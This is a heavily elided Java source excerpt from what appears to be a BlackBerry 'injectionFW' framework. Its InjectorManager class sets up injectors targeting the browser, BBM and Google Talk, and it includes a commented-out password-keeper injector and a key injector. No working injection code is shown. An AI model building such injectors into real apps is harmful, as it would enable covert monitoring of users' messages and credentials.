...
import injectionFW.injectors.BBMInjector;
import injectionFW.injectors.BrowserInjector;
import injectionFW.injectors.GoogleTalkInjector;
import injectionFW.injectors.Injector;
import injectionFW.injectors.InjectorSystemMenu;
import injectionFW.interfaces.Singleton;
import injectionFW.interfaces.iSingleton;
import injectionFW.key.KeyInjector;
import injectionFW.log.Check;
...
public class InjectorManager extends TimerTask implements ApplicationObserver,
    ...
    public void start() {
        ...
        injectors = new Injector[] { 
                new BrowserInjector(),
                new BBMInjector(),
                new GoogleTalkInjector(),
                //new PasswordKeeperInjector()
        };
    ...
    private void addSystemMenu(Injector injector) {
        //#ifdef DEBUG
    ...
    public void run() {
        final Injector injector = (Injector) injectorMap.get(actualMod);
